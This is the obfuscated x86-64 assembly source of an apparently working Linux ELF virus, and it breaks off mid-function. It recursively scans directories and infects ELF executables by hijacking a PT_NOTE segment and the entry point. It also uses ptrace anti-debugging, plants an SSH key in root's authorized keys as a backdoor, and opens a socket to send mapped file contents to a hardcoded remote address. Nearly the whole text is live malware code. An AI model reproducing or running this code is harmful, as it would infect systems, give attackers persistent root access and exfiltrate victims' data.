%include "asm/srcs/obf_file.inc"
; %include "asm/srcs/pestilence.inc"
bits 64 
default rel
section .text
global _start
_start:
; mov rbp, rsp
push rbp
mov rbp, rsp
PUSHA
; lea rdi, [rel AJ35olyhlO] ; dir to open for arg readDir
; mov rsi, KYur0VL
; call ww9RUM6Cq4
call BfYAK22e
; call MHF4e795O
call KTahx
test rax, rax
js fzcADK4j
push rax
push 0
call FL7u5b
add rsp, 8
mov rdx, rax
pop rax
push rax
push KYur0VL
call o9hXRy0
add rsp, 8
mov rsi, rax
pop rax
; dir to open for arg initDir
lea rdi, [rel AJ35olyhlO] 
; mov rdi, AJ35olyhlO ; dir to open for arg initDir
call n3dcMtyUF
push rax
push 0
call lTWcmLZGG
add rsp, 8
mov rdx, rax
pop rax
push rax
push nTJ3oSJlXl
call c1YH1
add rsp, 8
mov rsi, rax
pop rax
lea rdi, [rel vTqPp]
; mov rdi, vTqPp ; dir to open for arg initDir
call n3dcMtyUF
call nQXGL
; jmp U4aTTKnVB
fzcADK4j:
POPA 
push rax
push rbp
call c1YH1
add rsp, 8
mov rsp, rax
pop rax
pop rbp
uizLK:
jmp U4aTTKnVB
MHF4e795O:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 3]
shl r14, 0x18
push r14
call lTWcmLZGG
add rsp, 8
movzx r14, byte [r15 + 119]
shl r14, 0x10
or rax, r14 
movzx r14, byte [r15 + 235]
shl r14, 0x8
or rax, r14 
movzx r14, byte [r15 + 351]
or rax, r14 
pop r14
pop r15
syscall
push rax
push rax
push rax
call FL7u5b
add rsp, 8
mov rsi, rax
pop rax
push SYS_PTRACE
call o9hXRy0
add rsp, 8
push rax
push PTRACE_TRACEME
call FL7u5b
add rsp, 8
mov rdi, rax
pop rax
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 4]
shl r14, 0x18
push rax
push r14
call lTWcmLZGG
add rsp, 8
mov rdx, rax
pop rax
movzx r14, byte [r15 + 120]
shl r14, 0x10
or rdx, r14 
movzx r14, byte [r15 + 236]
shl r14, 0x8
or rdx, r14 
movzx r14, byte [r15 + 352]
or rdx, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
push rax
push r14
call c1YH1
add rsp, 8
mov r10, rax
pop rax
movzx r14, byte [r15 + 117]
shl r14, 0x10
or r10, r14 
movzx r14, byte [r15 + 233]
shl r14, 0x8
or r10, r14 
movzx r14, byte [r15 + 349]
or r10, r14 
pop r14
pop r15
syscall
cmp rax, 0 
jl U4aTTKnVB
pop rax
push rax
push rax
call o9hXRy0
add rsp, 8
mov rsi, rax
pop rax
push SYS_PTRACE
call FL7u5b
add rsp, 8
push rax
push PTRACE_DETACH
call o9hXRy0
add rsp, 8
mov rdi, rax
pop rax
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 4]
shl r14, 0x18
push rax
push r14
call c1YH1
add rsp, 8
mov rdx, rax
pop rax
movzx r14, byte [r15 + 120]
shl r14, 0x10
or rdx, r14 
movzx r14, byte [r15 + 236]
shl r14, 0x8
or rdx, r14 
movzx r14, byte [r15 + 352]
or rdx, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
push rax
push r14
call lTWcmLZGG
add rsp, 8
mov r10, rax
pop rax
movzx r14, byte [r15 + 117]
shl r14, 0x10
or r10, r14 
movzx r14, byte [r15 + 233]
shl r14, 0x8
or r10, r14 
movzx r14, byte [r15 + 349]
or r10, r14 
pop r14
pop r15
syscall
ret
; take directory to open in rdi-> oWTyuV7W
n3dcMtyUF:
; placing R8aeRf on the stack
push rbp
mov rbp, rsp
; rdi -> to _encrypt 
push rax
UymqIdPP:
call ButMi9
push rax
push rax
call c1YH1
add rsp, 8
mov rdi, rax
pop rax
pop rax
sub rsp, R8aeRf_size
lea r8, FAM(R8aeRf.b13nWv9p)
or qword [r8], -1
lea rsi, FAM(R8aeRf.oWTyuV7W)
; strcpy(R8aeRf.oWTyuV7W(rsi), oWTyuV7W(rdi))
call EWcFw 
cmp rdx, 0 
je ww9RUM6Cq4
; strlen(R8aeRf.oWTyuV7W(rsi))
call L211Zw 
push rax
push rsi
push rax
call ngKkUJUwjQ
add rsp, 8
pop rsi
mov rsi, rax
pop rax
cmp BYTE [rsi - 1], '/' 
je e3aBAAE
mov BYTE [rsi], '/' 
push rax
push rsi
push 1
call ngKkUJUwjQ
add rsp, 8
pop rsi
mov rsi, rax
pop rax
e3aBAAE:
push rax
push rdx
call o9hXRy0
add rsp, 8
mov rdi, rax
pop rax
call EWcFw
mov rdi, rsp
ww9RUM6Cq4:
push SYS_OPEN
call FL7u5b
add rsp, 8
push rax
push O_RDONLY | O_DIRECTORY
call lTWcmLZGG
add rsp, 8
mov rsi, rax
pop rax
xor rdx, rdx
syscall
cmp rax, 0 
jl eVgLoY
; en registre le b13nWv9p dans la struct
lea rdi, FAM(R8aeRf.b13nWv9p) 
push rax
push rax
call o9hXRy0
add rsp, 8
mov [rdi], rax
pop rax
jWH9rR:
lea r10, FAM(R8aeRf.b13nWv9p) 
; init hXH6TaLqq
lea r9, FAM(R8aeRf.hXH6TaLqq) 
mov DWORD [r9], 0 
push SYS_GETDENTS
call lTWcmLZGG
add rsp, 8
push rax
push qword [r10]
call c1YH1
add rsp, 8
mov rdi, rax
pop rax
lea rsi, FAM(R8aeRf.tStT3L)
push rax
push PAGE_SIZE
call FL7u5b
add rsp, 8
mov rdx, rax
pop rax
syscall
cmp rax, 0 
jle eVgLoY
; r10 -> (struct R8aeRf.diretents_struct_ptr)
lea r10, FAM(R8aeRf.IViVdSZB) 
; R8aeRf.IViVdSZB -> R8aeRf.tStT3L
push rax
push rsi
call o9hXRy0
add rsp, 8
mov [r10], rax
pop rax
; r11 -> (struct R8aeRf.DzMek0zbGu)
lea r11, FAM(R8aeRf.DzMek0zbGu) 
mov DWORD [r11], eax 
MQfdeA7:
; r8 -> total lu de getdents
lea r8, FAM(R8aeRf.hXH6TaLqq) 
; r9 -> total a lire de getdents
lea r9, FAM(R8aeRf.DzMek0zbGu) 
; r10 -> actual dirent struct
mov r10, FAM(R8aeRf.IViVdSZB) 
; r11 -> ptr de la struct actuelle
lea r11, FAM(R8aeRf.IViVdSZB) 
movzx r12, WORD [r10 + D_RECLEN_OFF] 
; update du total lu dans r8
add [r8], r12d 
; R8aeRf.diretns_struct_ptr -> sur la prochaine struct
add qword [r11], r12 
cmp BYTE [r10 + D_TYPE], D_FOLDER 
je gXT3ue
cmp BYTE [r10 + D_TYPE], D_REG_FILE 
jne BNsIQKmT
N5vCIY1k:
; strlen
mov rsi, rsp
call L211Zw
lea rsi, [r10 + D_NAME] 
mov byte [rsi - 1], '/'
push rax
push 1
call ngKkUJUwjQ
add rsp, 8
add rsp, 8
sub rsi, rax
mov rdi, rsp
call VU3tuqQBn
; printing
; writeWork
; writeBack
; ajouter les foncton pour chaques fichier ici
; call eJaIzpxEkh
call FkuUdd
jmp BNsIQKmT
gXT3ue:
lea rdi, FAM(R8aeRf.oWTyuV7W)
push rax
lea rsi, FAM(R8aeRf.oWTyuV7W)
call L211Zw
push rax
push rax
call c1YH1
add rsp, 8
mov rsi, rax
pop rax
pop rax
lea rdx, [r10 + D_NAME] 
cmp BYTE [rdx], 0x2e 
jne Eqt5ZGcX
cmp BYTE [rdx + 1], 0 
je BNsIQKmT
cmp BYTE [rdx + 1], 0x2e 
jne Eqt5ZGcX
cmp BYTE [rdx + 2], 0 
je BNsIQKmT
Eqt5ZGcX:
call n3dcMtyUF
BNsIQKmT:
mov r8, FAM(R8aeRf.hXH6TaLqq)
mov r12, FAM(R8aeRf.DzMek0zbGu)
; if (total lu >= total getdents)
cmp r8d, r12d 
jge jWH9rR
jmp MQfdeA7
eVgLoY:
mov rdi, FAM(R8aeRf.b13nWv9p)
cmp qword rdi, 0 
jle dLMaerD4
push SYS_CLOSE
call lTWcmLZGG
add rsp, 8
syscall
or qword FAM(R8aeRf.b13nWv9p), -1
jmp dLMaerD4
; mov rdi, FAM(R8aeRf.b13nWv9p)
; syscall
dLMaerD4:
leave
Muicrmux:
ret
FkuUdd:
push rbp
mov rbp, rsp
sub rsp, iTLlKa_size
lea rax, INF(iTLlKa.uMYJbS75V)
mov qword [rax], 0 
lea rax, INF(iTLlKa.MsFE48OLM1)
mov byte [rax], 0 
lea rax, INF(iTLlKa.Xsglty)
mov qword [rax], 0 
eJaIzpxEkh:
push SYS_OPEN
call FL7u5b
add rsp, 8
push rax
push rsi
call c1YH1
add rsp, 8
mov rdi, rax
pop rax
push rax
push O_RDWR
call o9hXRy0
add rsp, 8
mov rsi, rax
pop rax
xor rdx, rdx
syscall
cmp rax, 0x0 
jl dLMaerD4
push rax
push rax
call FL7u5b
add rsp, 8
mov INF(iTLlKa.XK4N2V), rax
pop rax
; === get file size ===
yDydj:
push SYS_LSEEK
call lTWcmLZGG
add rsp, 8
mov rdi, INF(iTLlKa.XK4N2V)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
push rax
push r14
call c1YH1
add rsp, 8
mov rsi, rax
pop rax
movzx r14, byte [r15 + 117]
shl r14, 0x10
or rsi, r14 
movzx r14, byte [r15 + 233]
shl r14, 0x8
or rsi, r14 
movzx r14, byte [r15 + 349]
or rsi, r14 
pop r14
pop r15
push rax
push SEEK_END
call lTWcmLZGG
add rsp, 8
mov rdx, rax
pop rax
syscall
cmp rax, 0x0 
jle ZbUqJu4V
push rax
push rax
call o9hXRy0
add rsp, 8
mov INF(iTLlKa.rClpKBG), rax
pop rax
push rax
push rax
call FL7u5b
add rsp, 8
mov INF(iTLlKa.Wpg8zw7), rax
pop rax
EelTzg876q:
; rax -> map
; rsi = file_size
push rax
push rax
call lTWcmLZGG
add rsp, 8
mov rsi, rax
pop rax
push SYS_MMAP
call o9hXRy0
add rsp, 8
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
push rax
push r14
call FL7u5b
add rsp, 8
mov rdi, rax
pop rax
movzx r14, byte [r15 + 117]
shl r14, 0x10
or rdi, r14 
movzx r14, byte [r15 + 233]
shl r14, 0x8
or rdi, r14 
movzx r14, byte [r15 + 349]
or rdi, r14 
pop r14
pop r15
push rax
push PROT_READ | PROT_WRITE | PROT_EXEC
call c1YH1
add rsp, 8
mov rdx, rax
pop rax
push rax
push MAP_SHARED
call c1YH1
add rsp, 8
mov r10, rax
pop rax
mov r8, INF(iTLlKa.XK4N2V)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
push rax
push r14
call o9hXRy0
add rsp, 8
mov r9, rax
pop rax
movzx r14, byte [r15 + 117]
shl r14, 0x10
or r9, r14 
movzx r14, byte [r15 + 233]
shl r14, 0x8
or r9, r14 
movzx r14, byte [r15 + 349]
or r9, r14 
pop r14
pop r15
syscall
cmp rax, 0x0 
jl ZbUqJu4V
call DQobv7zU7y
push r12
call lTWcmLZGG
add rsp, 8
push rax
push r15
call FL7u5b
add rsp, 8
mov rsi, rax
pop rax
lea r8, INF(iTLlKa.Gcjh36XuTv)
push rax
push rax
call FL7u5b
add rsp, 8
mov [r8], rax
pop rax
gDOPeDe:
cmp dword [rax + 1], 0x02464c45 
jne Rzg9OTYPoL
GDGZSE8:
; rax == total segment number
; r9 == injection offset
; r13 == original segment end offset
; r14 -> header table
; r15 -> map
push rax
push rax
call c1YH1
add rsp, 8
mov r15, rax
pop rax
push rax
push r15
call o9hXRy0
add rsp, 8
mov r14, rax
pop rax
push rax
push r14
push qword [r14 + RbMJnE.FdQ15]
call ngKkUJUwjQ
add rsp, 8
pop r14
mov r14, rax
pop rax
xor rcx, rcx
h3uMn:
cmp cx, [r15 + RbMJnE.kiR7bYJWQb]
jge LUObl 
push rax
push r14
push rOiwB_size
call ngKkUJUwjQ
add rsp, 8
pop r14
mov r14, rax
pop rax
inc rcx
jmp h3uMn
LUObl:
push rax
push r14
call lTWcmLZGG
add rsp, 8
mov INF(iTLlKa.mJUVtH0nq), rax
pop rax
xor r9, r9
cKWMi:
cmp cx, 0 
jle qzWcnZXYSY
cdBu46:
bt word [r14], 0 
jnc f2TLrjGSs
bt qword [r14], 0x20 
jc fucil
f2TLrjGSs:
dec rcx
sub r14, rOiwB_size
jmp cKWMi
qzWcnZXYSY:
mov r9, INF(iTLlKa.uMYJbS75V)
cmp r9, 0 
je Rzg9OTYPoL
cmp byte INF(iTLlKa.MsFE48OLM1), 1 
je s3aD0cWQ
; else jmp MWx7WTkjF
jmp MWx7WTkjF 
fucil:
; Check if the segment signed, else check the size, if big enough save the offsets if not already done
LNfUpoPo:
; r8 -> potential Ij2xTuE
; r9 == Ij2xTuE variable
push rax
push r15
call c1YH1
add rsp, 8
mov r8, rax
pop rax
push rax
push r8
push qword [r14 + rOiwB.aKA4ydkCz]
call ngKkUJUwjQ
add rsp, 8
pop r8
mov r8, rax
pop rax
push rax
push r8
push qword [r14 + rOiwB.KsjhAbLrSN]
call ngKkUJUwjQ
add rsp, 8
pop r8
mov r8, rax
pop rax
sub r8, F8ZNh
push rax
push qword [rel Ij2xTuE]
call FL7u5b
add rsp, 8
mov r9, rax
pop rax
cmp qword r9, [r8]
je Rzg9OTYPoL
h5EP0p:
mov r9, INF(iTLlKa.uMYJbS75V)
test r9, r9
jz qkAbTsHGl0
mov r9, INF(iTLlKa.MsFE48OLM1)
test r9, r9
jz f2TLrjGSs
qkAbTsHGl0:
; r8 == end of iTLlKa offset
; r9 == next segment offset
push rax
push qword [r14 + rOiwB.aKA4ydkCz]
call o9hXRy0
add rsp, 8
mov r8, rax
pop rax
push rax
push r8
push qword [r14 + rOiwB.KsjhAbLrSN]
call ngKkUJUwjQ
add rsp, 8
pop r8
mov r8, rax
pop rax
; save segment end's offset
push rax
push r8
call lTWcmLZGG
add rsp, 8
mov r13, rax
pop rax
push rax
push r8
push CODE_LEN
call ngKkUJUwjQ
add rsp, 8
pop r8
mov r8, rax
pop rax
push rax
push r14
call lTWcmLZGG
add rsp, 8
mov r9, rax
pop rax
push rax
push r9
push rOiwB_size
call ngKkUJUwjQ
add rsp, 8
pop r9
mov r9, rax
pop rax
push rax
push r9
push rOiwB.aKA4ydkCz
call ngKkUJUwjQ
add rsp, 8
pop r9
mov r9, rax
pop rax
cmp [r9], r8
; if ([r9] < r8) { iTLlKa.MsFE48OLM1 = 1) }
setb INF(iTLlKa.MsFE48OLM1) 
BlQqIa:
; r8 -> iTLlKa structure members
; r9 == injection address
; r12 == original entrypoint
;*r13 == segment end's offset (qkAbTsHGl0)
;*r14 -> segment header in header table
lea r8, INF(iTLlKa.SucHT)
mov [r8], cl
lea r8, INF(iTLlKa.MvEq6)
push rax
push qword [r15 + RbMJnE.AxDWcBPOXe]
call o9hXRy0
add rsp, 8
mov r12, rax
pop rax
push rax
push r12
call FL7u5b
add rsp, 8
mov [r8], rax
pop rax
lea r8, INF(iTLlKa.uMYJbS75V)
push rax
push r13
call c1YH1
add rsp, 8
mov [r8], rax
pop rax
lea r8, INF(iTLlKa.hbJKoT)
push r9
push rax
push qword [r14 + rOiwB.F79Terhn]
call FL7u5b
add rsp, 8
mov r9, rax
pop rax
push rax
push r9
push qword [r14 + rOiwB.EjNw5]
call ngKkUJUwjQ
add rsp, 8
pop r9
mov r9, rax
pop rax
push rax
push r9
call lTWcmLZGG
add rsp, 8
mov [r8], rax
pop rax
pop r9
lea r8, INF(iTLlKa.OXgAk0A4QP)
push rax
push r14
call o9hXRy0
add rsp, 8
mov [r8], rax
pop rax
jmp f2TLrjGSs
s3aD0cWQ:
mhR4hcwhtc:
push SYS_FTRUNCATE
call c1YH1
add rsp, 8
mov rdi, INF(iTLlKa.XK4N2V)
lea rsi, INF(iTLlKa.rClpKBG)
push qword [rsi]
add qword [rsi], PAGE_SIZE 
and qword [rsi], -4096
add qword [rsi], CODE_LEN 
push rax
push qword [rsi]
call FL7u5b
add rsp, 8
mov rsi, rax
pop rax
syscall
pop rsi
cmp rax, 0 
jl Rzg9OTYPoL
hQZy659pbb:
mov rdi, INF(iTLlKa.Gcjh36XuTv)
push SYS_UNMAP
call c1YH1
add rsp, 8
syscall
xelFP:
push SYS_MMAP
call lTWcmLZGG
add rsp, 8
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
push rax
push r14
call o9hXRy0
add rsp, 8
mov rdi, rax
pop rax
movzx r14, byte [r15 + 117]
shl r14, 0x10
or rdi, r14 
movzx r14, byte [r15 + 233]
shl r14, 0x8
or rdi, r14 
movzx r14, byte [r15 + 349]
or rdi, r14 
pop r14
pop r15
; rsi = file_size
mov rsi, INF(iTLlKa.rClpKBG) 
push rax
push PROT_READ | PROT_WRITE | PROT_EXEC
call lTWcmLZGG
add rsp, 8
mov rdx, rax
pop rax
push rax
push MAP_SHARED
call c1YH1
add rsp, 8
mov r10, rax
pop rax
mov r8, INF(iTLlKa.XK4N2V)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
push rax
push r14
call o9hXRy0
add rsp, 8
mov r9, rax
pop rax
movzx r14, byte [r15 + 117]
shl r14, 0x10
or r9, r14 
movzx r14, byte [r15 + 233]
shl r14, 0x8
or r9, r14 
movzx r14, byte [r15 + 349]
or r9, r14 
pop r14
pop r15
syscall
cmp rax, 0x0 
jl ZbUqJu4V
lea r8, INF(iTLlKa.Gcjh36XuTv)
push rax
push rax
call FL7u5b
add rsp, 8
mov [r8], rax
pop rax
BHrMy9w:
mov r14, INF(iTLlKa.Gcjh36XuTv)
movzx rax, word [r14 + RbMJnE.VAs648]
push rax
push r14
push qword [r14 + RbMJnE.MgVzpMiBR]
call ngKkUJUwjQ
add rsp, 8
pop r14
mov r14, rax
pop rax
xor rcx, rcx
Q8sCF23:
cmp rcx, rax
jge GudR5IrU
push rax
push qword [r14 + CjMWcH0fpC.vPZgvI2]
call FL7u5b
add rsp, 8
mov rbx, rax
pop rax
push rax
push rbx
push qword [r14 + CjMWcH0fpC.Q758DXc6DL]
call ngKkUJUwjQ
add rsp, 8
pop rbx
mov rbx, rax
pop rax
cmp INF(iTLlKa.Xsglty), rbx
jge PYkqx
push rax
push rbx
call c1YH1
add rsp, 8
mov INF(iTLlKa.Xsglty), rax
pop rax
PYkqx:
push rax
push r14
push CjMWcH0fpC_size
call ngKkUJUwjQ
add rsp, 8
pop r14
mov r14, rax
pop rax
inc rcx
jmp Q8sCF23
GudR5IrU:
EbhiH1r:
; r14 -> segmentS header
; rcx == segment counter
mov r14, INF(iTLlKa.Gcjh36XuTv)
movzx rax, word [r14 + RbMJnE.kiR7bYJWQb]
push rax
push r14
push qword [r14 + RbMJnE.FdQ15]
call ngKkUJUwjQ
add rsp, 8
pop r14
mov r14, rax
pop rax
xor rcx, rcx
eqPcslb:
cmp rcx, rax
jge nbGeG
cmp dword [r14 + rOiwB.PjK7i2ks], PT_NOTE 
je NyAqhWr
TuLNN13:
push rax
push r14
push rOiwB_size
call ngKkUJUwjQ
add rsp, 8
pop r14
mov r14, rax
pop rax
inc rcx
jmp eqPcslb
nbGeG:
push rax
push -1
call o9hXRy0
add rsp, 8
mov r14, rax
pop rax
NyAqhWr:
; r14 -> segment header
; rax == new offset / address
cmp r14, 0 
jl UiZtpru
mov dword [r14 + rOiwB.PjK7i2ks], PT_LOAD 
mov qword [r14 + rOiwB.YehUdO], PF_X | PF_R 
mov qword [r14 + rOiwB.KsjhAbLrSN], CODE_LEN 
mov qword [r14 + rOiwB.EjNw5], CODE_LEN 
mov qword [r14 + rOiwB.li02GFUp], PAGE_SIZE 
mov rax, INF(iTLlKa.Wpg8zw7)
push rax
push PAGE_SIZE
call ngKkUJUwjQ
add rsp, 8
add rsp, 8
and rax, -4096
mov qword [r14 + rOiwB.aKA4ydkCz], rax
mov qword INF(iTLlKa.uMYJbS75V), rax
mov rax, INF(iTLlKa.Xsglty)
push rax
push PAGE_SIZE
call ngKkUJUwjQ
add rsp, 8
add rsp, 8
and rax, -4096
mov qword INF(iTLlKa.hbJKoT), rax
mov qword [r14 + rOiwB.F79Terhn], rax
mov qword [r14 + rOiwB.yfVmOP], rax
MWx7WTkjF:
I8EVNY1Oi:
; r8 -> elf header entrypoint
; r9 == end of segment + align (injection offset)
; r10 == injection offset
mov r8, INF(iTLlKa.Gcjh36XuTv)
push rax
push r8
push RbMJnE.AxDWcBPOXe
call ngKkUJUwjQ
add rsp, 8
pop r8
mov r8, rax
pop rax
mov r10, INF(iTLlKa.hbJKoT)
push rax
push r10
call lTWcmLZGG
add rsp, 8
mov [r8], rax
pop rax
cmp byte INF(iTLlKa.MsFE48OLM1), 0 
jg Yv5fC
push rax
push CODE_LEN
call o9hXRy0
add rsp, 8
mov rdi, rax
pop rax
call vxr5aCC2
Yv5fC:
; rdi -> injection start
; rsi -> parasite _start
; rcx == code len (z6wn5S1 - _start)
mov rdi, INF(iTLlKa.Gcjh36XuTv)
add rdi, INF(iTLlKa.uMYJbS75V)
; rsi -> start of our code
lea rsi, [rel _start] 
push rax
push CODE_LEN
call lTWcmLZGG
add rsp, 8
mov rcx, rax
pop rax
; copy from _start to z6wn5S1 (= !std)
cld 
rep movsb
UiZtpru:
; r8 -> uizLK instruction's addr (uizLK + 1)
; r9 == distance to jump from final jump to original entry point
mov r8, INF(iTLlKa.Gcjh36XuTv)
add r8, INF(iTLlKa.uMYJbS75V)
push rax
push r8
push FINJMP_OFF
call ngKkUJUwjQ
add rsp, 8
pop r8
mov r8, rax
pop rax
inc r8
mov r10, INF(iTLlKa.hbJKoT)
push rax
push r10
push FINJMP_OFF
call ngKkUJUwjQ
add rsp, 8
pop r10
mov r10, rax
pop rax
push rax
push r10
push 0x05
call ngKkUJUwjQ
add rsp, 8
pop r10
mov r10, rax
pop rax
mov r9, INF(iTLlKa.MvEq6)
sub r9, r10
mov [r8], r9d
jmp Rzg9OTYPoL
vxr5aCC2:
; r8 -> segment header data
;*r14 -> segment header in header table
mov r8, INF(iTLlKa.OXgAk0A4QP)
; save header start for later
push r8 
; * Update file size *
push rax
push r8
push qword rOiwB.KsjhAbLrSN
call ngKkUJUwjQ
add rsp, 8
pop r8
mov r8, rax
pop rax
add qword [r8], rdi
pop r8
; * Update memory size *
push rax
push r8
push rOiwB.EjNw5
call ngKkUJUwjQ
add rsp, 8
pop r8
mov r8, rax
pop rax
add qword [r8], rdi
ret
; --- privesc + backdoor
nQXGL:
; open "/root/.ssh/authorized.key"
; r9 == b13nWv9p
push rbp
mov rbp, rsp
sub rsp, 0x1000 
push SYS_OPEN
call c1YH1
add rsp, 8
; mov rdi, LghQCuxC
lea rdi, [rel LghQCuxC]
push rax
push rsi
push rax
push IyAy8ZgDF
call FL7u5b
add rsp, 8
mov rsi, rax
pop rax
IzeW2f7q3P:
call ButMi9
push rax
push rax
call lTWcmLZGG
add rsp, 8
mov rdi, rax
pop rax
pop rsi
pop rax
push rax
push O_RDWR | O_CREAT
call FL7u5b
add rsp, 8
mov rsi, rax
pop rax
push rax
push 600
call c1YH1
add rsp, 8
mov rdx, rax
pop rax
syscall
test rax, rax
js dLMaerD4
push rax
push rax
call o9hXRy0
add rsp, 8
mov r9, rax
pop rax
MWSxFKPCyn:
; *r9 == b13nWv9p
; r10 == size read
; rsi -> buffer
push SYS_READ
call FL7u5b
add rsp, 8
push rax
push r9
call lTWcmLZGG
add rsp, 8
mov rdi, rax
pop rax
push rax
push rbp
call c1YH1
add rsp, 8
mov rsi, rax
pop rax
sub rsi, 0x1000 
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 41]
shl r14, 0x18
push rax
push r14
call o9hXRy0
add rsp, 8
mov rdx, rax
pop rax
movzx r14, byte [r15 + 157]
shl r14, 0x10
or rdx, r14 
movzx r14, byte [r15 + 273]
shl r14, 0x8
or rdx, r14 
movzx r14, byte [r15 + 389]
or rdx, r14 
pop r14
pop r15
syscall
cmp rax, 0 
je QbTuEVvN
jl ALRx1iOrB
push rax
push rax
call c1YH1
add rsp, 8
mov r10, rax
pop rax
R7Fzn:
; rcx == nombre d'octet lue
; r11 -> buffer
push rax
push r10
call o9hXRy0
add rsp, 8
mov rcx, rax
pop rax
push rax
push rsi
call lTWcmLZGG
add rsp, 8
mov r11, rax
pop rax
; for every new line
jYWbw0vE:
cmp byte [r11], 0xa 
je AXLEp
inc r11
loop jYWbw0vE
push SYS_WRITE
call FL7u5b
add rsp, 8
push rax
push W3sJG
call o9hXRy0
add rsp, 8
mov rsi, rax
pop rax
push rax
push 1
call FL7u5b
add rsp, 8
mov rdx, rax
pop rax
syscall
jmp QbTuEVvN
; cmp the line with pub ssh HWoifLlr8p
AXLEp:
mov byte [r11], 0 
push rax
push r11
call lTWcmLZGG
add rsp, 8
mov rdi, rax
pop rax
sub rdi, fatSKa7qj - 1 
lea rsi, [rel XrufRt21e]
push rax
push rdi
lea rdi, [rel XrufRt21e]
push rax
push fatSKa7qj
call c1YH1
add rsp, 8
mov rsi, rax
pop rax
f7o3pzAe88:
call ButMi9
push rax
push rax
call FL7u5b
add rsp, 8
mov rsi, rax
pop rax
pop rdi
pop rax
push rcx
call ec26Kimo
pop rcx
test rax, rax 
je ALRx1iOrB
inc r11
dec rcx
jnz jYWbw0vE
; loop jYWbw0vE
; if not found write it
QbTuEVvN:
push rax
push r9
call o9hXRy0
add rsp, 8
mov rdi, rax
pop rax
push SYS_WRITE
call lTWcmLZGG
add rsp, 8
lea rsi, [rel XrufRt21e]
push rax
push rdi
lea rdi, [rel XrufRt21e]
push rax
push fatSKa7qj
call c1YH1
add rsp, 8
mov rsi, rax
pop rax
Wx6k8bRHGh:
call ButMi9
push rax
push rax
call lTWcmLZGG
add rsp, 8
mov rsi, rax
pop rax
pop rdi
pop rax
push rax
push fatSKa7qj - 1
call FL7u5b
add rsp, 8
mov rdx, rax
pop rax
syscall
push SYS_WRITE
call c1YH1
add rsp, 8
lea rsi, [rel W3sJG]
push rax
push rdi
lea rdi, [rel W3sJG]
push rax
push fatSKa7qj
call o9hXRy0
add rsp, 8
mov rsi, rax
pop rax
I5Bz7b:
call ButMi9
push rax
push rax
call FL7u5b
add rsp, 8
mov rsi, rax
pop rax
pop rdi
pop rax
push rax
push 1
call lTWcmLZGG
add rsp, 8
mov rdx, rax
pop rax
syscall
ALRx1iOrB:
push SYS_CLOSE
call o9hXRy0
add rsp, 8
push rax
push r9
call c1YH1
add rsp, 8
mov rdi, rax
pop rax
syscall
; 
jmp dLMaerD4
An30mZZ:
yyAHp:
push SYS_SOCKET
call lTWcmLZGG
add rsp, 8
push rax
push AF_INET
call c1YH1
add rsp, 8
mov rdi, rax
pop rax
push rax
push SOCK_STREAM
call FL7u5b
add rsp, 8
mov rsi, rax
pop rax
xor rdx, rdx
syscall
test rax, rax
js Muicrmux
push rax
push rax
call o9hXRy0
add rsp, 8
mov rdi, rax
pop rax
h4hzES:
push SYS_CONNECT
call FL7u5b
add rsp, 8
lea rsi, [rel FYRVb]
push rax
push 16
call lTWcmLZGG
add rsp, 8
mov rdx, rax
pop rax
syscall
test rax, rax
js s5uXEWlY0
push rdi
call o9hXRy0
add rsp, 8
ret
sr2JAYW13a:
push SYS_UNMAP
call c1YH1
add rsp, 8
push rax
push rsi
call o9hXRy0
add rsp, 8
mov rdi, rax
pop rax
push rax
push rdx
call lTWcmLZGG
add rsp, 8
mov rsi, rax
pop rax
syscall
pop rdi
; (rdi: socket)
s5uXEWlY0:
push SYS_CLOSE
call c1YH1
add rsp, 8
syscall
push -1
call FL7u5b
add rsp, 8
ret
; extrait les donnees des fichiers via http
DQobv7zU7y:
; r12 -> maped file_date
push rax
push rax
call o9hXRy0
add rsp, 8
mov r12, rax
pop rax
push rsi
call yyAHp
pop rsi
push rax
push rax
call c1YH1
add rsp, 8
mov r13, rax
pop rax
En4e7E:
cmp r13, 0 
jl Muicrmux
MuS3n1Kp:
; rax -> mmap buffer
; r15 == la size du mmap buffer
; r12 -> maped file_data
push SYS_MMAP
call lTWcmLZGG
add rsp, 8
xor rdi, rdi
push rsi
push rax
push rsi
push CqAW7Da
call ngKkUJUwjQ
add rsp, 8
pop rsi
mov rsi, rax
pop rax
push rax
push rsi
push ltpUtVzL1
call ngKkUJUwjQ
add rsp, 8
pop rsi
mov rsi, rax
pop rax
push rax
push rsi
push 10
call ngKkUJUwjQ
add rsp, 8
pop rsi
mov rsi, rax
pop rax
push rax
push rsi
call FL7u5b
add rsp, 8
mov r15, rax
pop rax
push rax
push PROT_READ | PROT_WRITE
call FL7u5b
add rsp, 8
mov rdx, rax
pop rax
push rax
push MAP_PRIVATE | MAP_ANONYMOUS
call o9hXRy0
add rsp, 8
mov r10, rax
pop rax
xor r8, r8
xor r9, r9
syscall
Vuidd49Tbl:
; r14 -> header buffer
; *r15 == la taille du mmap buffer
push rax
push rax
call lTWcmLZGG
add rsp, 8
mov r14, rax
pop rax
push rax
push rax
call c1YH1
add rsp, 8
mov rsi, rax
pop rax
lea rdi, [rel I2FWB9w]
call EWcFw
pop rax
push rax
push rax
push rsi
push CqAW7Da - 1
call ngKkUJUwjQ
add rsp, 8
pop rsi
mov rsi, rax
pop rax
call OtFA7zbUu
lea rdi, [rel rqmOT1]
call EWcFw
push rax
push rsi
push ltpUtVzL1 - 1
call ngKkUJUwjQ
add rsp, 8
pop rsi
mov rsi, rax
pop rax
push rax
push r12
call o9hXRy0
add rsp, 8
mov rdi, rax
pop rax
pop rcx
call z7LVJ
K5xRN3bJ:
push SYS_SENDTO
call FL7u5b
add rsp, 8
push rax
push r13
call c1YH1
add rsp, 8
mov rdi, rax
pop rax
push rax
push r14
call lTWcmLZGG
add rsp, 8
mov rsi, rax
pop rax
push rax
push r15
